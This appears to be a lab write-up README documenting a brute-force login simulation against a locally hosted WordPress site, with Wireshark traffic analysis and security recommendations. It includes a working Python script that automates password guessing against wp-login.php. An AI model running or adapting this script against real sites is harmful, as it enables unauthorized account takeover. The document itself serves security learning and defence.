# Brute Force Attack Simulation and Analysis on WordPress

## 📌 Project Overview
This project demonstrates a brute force attack simulation on a locally hosted WordPress site. The objective was to understand the mechanics of brute force attacks, test security measures, and analyze the attack patterns using Wireshark.

## 🚀 Project Goals
- Simulate a brute force attack using Python.  
- Analyze the attack patterns using Wireshark.  
- Test the effectiveness of the **Limit Login Attempts Reloaded** plugin.  
- Document the findings and suggest improvements.  

## 🛠️ Tools and Environment
| Tool | Purpose |
|------|---------|
| XAMPP | Local server environment (Apache, MySQL, PHP) |
| WordPress | Content Management System (CMS) |
| MySQL | Database backend for WordPress |
| Terminal | Command-line interface for configuration |
| Limit Login Attempts Reloaded | Security plugin for brute force mitigation |
| Wireshark | Network packet analysis tool |

## 🔧 Setup and Configuration
1. **Install XAMPP**  
   - Download and install from the official [XAMPP website](https://www.apachefriends.org/index.html).

2. **Set Up WordPress**  
   - Download WordPress and place it in the `htdocs` directory in the XAMPP folder.

3. **Create a MySQL Database**  
   - Create a database named `wordpress` using phpMyAdmin.

4. **Configure wp-config.php**  
   - Update database settings:
```php
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'password123!');
define('DB_HOST', '127.0.0.1:3306');
```

## Install Security Plugin
- Install Limit Login Attempts Reloaded from the WordPress dashboard.

## Grant Permissions
- Ensure proper permissions using the following command:
terminal 
```sudo chown -R ayo:staff /path/to/wordpress```


## 🧪 Brute Force Attack Execution

Python script used to automate login attempts:
``` import requests
from itertools import product
import string
import time

url = 'http://localhost/testsite/wp-login.php'
username = 'admin'
passwords = [''.join(x) for x in product(string.ascii_lowercase, repeat=2)]

for password in passwords:
    data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': 'http://localhost/testsite/wp-admin',
        'testcookie': '1'
    }
    response = requests.post(url, data=data)
    if 'dashboard' in response.text:
        print(f"[+] Success! Password found: {password}")
        break
    time.sleep(0.5)
```
-The script attempted multiple combinations until the correct password was found.

## 📊 Log Analysis Using Wireshark

- Open Wireshark and start capturing traffic.
Apply the following filter to isolate login attempts:

http.request.uri contains "wp-login.php"
http.host == "localhost"
ip.addr == 127.0.0.1
http.request.method == "POST"

Key findings:
- Number of login attempts: 50+
- Most common response code: 403 (Blocked)
- Source IP: 127.0.0.1
- User-Agent: python-requests/2.31.0

## ✅ Challenges and Resolutions

|Challenge|	Cause|Resolution|
|---------|------|----------|
| Error establishing database connection	|Incorrect DB_HOST value |	Corrected to 127.0.0.1:3306 |
| ModuleNotFoundError: No module named 'requests'|	Missing Python module |	Installed using pip install requests |
| chown: illegal group name |	Incorrect syntax |	Fixed using sudo chown -R ayo:staff |
| MySQL Error 1046 |	No database selected |	Used USE wordpress; |
| FTP credentials prompt |	Incorrect file permissions |	Defined FS_METHOD as 'direct' in wp-config.php |

## 🏆 Recommendations

- Enforce strong password policies (12+ characters, symbols).
- Implement Two-Factor Authentication (2FA) for added security.
- Use a Web Application Firewall (WAF) to block malicious traffic.
- Regularly monitor login attempts using SIEM tools like Microsoft Sentinel.
- Limit the number of allowed login attempts before blocking.

## 🔍 Lessons Learned

- Hands-on experience with configuring WordPress and MySQL.
- Understanding the mechanics of brute force attacks.
- Effective use of Python for penetration testing.
- Importance of rate limiting and monitoring in preventing automated attacks.
- Analyzing network traffic using Wireshark to detect anomalies.


🚨 Disclaimer

⚠️ This project was conducted in a controlled lab environment. Performing brute force attacks on unauthorized systems is illegal and punishable under law.

